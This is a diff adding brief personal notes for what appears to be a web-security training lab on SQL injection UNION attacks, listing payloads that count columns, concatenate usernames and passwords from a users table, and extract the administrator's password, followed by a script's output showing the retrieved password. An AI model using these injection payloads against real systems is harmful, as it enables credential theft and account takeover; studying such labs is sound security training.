@@ -1,0 +1,20 @@
+SQL injection UNION attack, retrieving multiple values in a single column
+
+UNION attack to retrieve data from other tables
+
+Retrieve all username and password and log in as administrator
+
+' UNION SELECT username || '~' || password FROM users--
+
+'order+by+2--
+
+'union+select+NULL,'DFGS'--
+
+'union+select+NULL,'FSVSFV'+from+users+where+username='administrator'--
+
+'union+select+NULL,password+from+users+where+username='administrator'--
+
+python lab6.py "https://LAB_ID.web-security-academy.net"
+[+] SQL Injection successfull, number of column: 2
+[+] SQL Injection successfull, column with data type string: 2
+[+] SQL Injection successfull, admin password: <th>lqg7afakb34h134ofmjb</th>
